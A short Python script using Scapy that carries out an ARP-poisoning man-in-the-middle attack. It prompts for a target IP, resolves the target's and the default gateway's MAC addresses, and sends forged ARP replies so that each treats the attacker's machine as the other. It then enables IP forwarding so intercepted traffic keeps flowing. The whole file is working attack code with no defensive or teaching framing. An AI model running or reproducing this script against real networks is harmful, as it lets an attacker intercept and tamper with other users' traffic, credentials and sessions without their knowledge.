import sys
import signal
from scapy.all import *
import socket
import fcntl
import struct
import netifaces

des_ip=raw_input("Input target ip:")

my_ip=netifaces.ifaddresses('ens33')[netifaces.AF_INET][0]['addr']

gateway_ip=netifaces.gateways()['default'][netifaces.AF_INET][0]

my_mac=[get_if_hwaddr(i) for i in get_if_list()][0]

ans,unans=sr(ARP(op=ARP.who_has,psrc=my_ip,pdst=des_ip,hwsrc=my_mac))
ans_g,unans_g=sr(ARP(op=ARP.who_has,psrc=my_ip,pdst=gateway_ip,hwsrc=my_mac))


result=str(ans[0])
result=result.split(" hwsrc=")[2]
result=result.split(" psrc=")[0]

result_g=str(ans_g[0])
result_g=result_g.split(" hwsrc=")[2]
result_g=result_g.split(" psrc=")[0]

choice=raw_input("If you want to start poisoning, print 1: If you don't want, press 2:")

if (choice=='1'):
	send(ARP(op=ARP.is_at,psrc=gateway_ip,pdst=des_ip,hwsrc=my_mac,hwdst=result))
	send(ARP(op=ARP.is_at,psrc=des_ip,pdst=gateway_ip,hwsrc=my_mac,hwdst=result_g))
	with open('/proc/sys/net/ipv4/ip_forward','w') as forwarding:
		forwarding.write('1\n')


